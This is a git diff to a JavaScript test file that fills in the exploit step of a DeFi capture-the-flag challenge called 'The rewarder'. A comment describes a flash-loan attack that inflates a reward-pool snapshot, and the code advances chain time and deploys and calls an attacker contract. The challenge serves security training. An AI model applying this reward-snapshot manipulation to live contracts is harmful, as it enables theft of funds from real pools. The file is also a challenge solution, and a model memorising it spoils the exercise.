@@ -65,7 +65,23 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /*
+        Goal is to have as many reward tokens as possible
+        Reward pool takes a snapshot of current state on the first distritubeRewards call
+        So we can:
+          1. grab all the tokens from the flash loan pool
+          2. add them to rewarder pool
+          3. call distributeRewards
+          4. then withdraw
+          5. send the tokens back
+        */
+        // Advance 5 days so another round can trigger
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        // Deploy contract
+        const attackerContractFactory = await ethers.getContractFactory('RewardAttacker', attacker);
+        const attackerContract = await attackerContractFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address);
+        // Call attack
+        await attackerContract.connect(attacker).attack();
     });
 
     after(async function () {
